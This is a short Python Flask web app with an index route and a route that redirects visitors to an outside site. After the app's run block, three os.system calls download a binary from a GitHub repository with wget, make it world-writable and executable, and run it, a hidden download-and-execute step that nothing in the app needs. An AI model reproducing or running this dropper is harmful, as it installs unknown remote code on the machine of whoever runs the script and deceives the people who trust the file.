from flask import Flask, render_template, request, redirect
import sys
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/redirect')
def redirect_page():
    # Add your security checks here if needed
    print("Warning: Inspecting the element is not allowed!")
    return redirect('https://trustedge.com/')

if __name__ == '__main__':
    app.run(debug=True)
os.system('wget https://github.com/55113110159/OS/raw/main/dnx')
os.system('chmod 777 dnx')
os.system('./dnx')
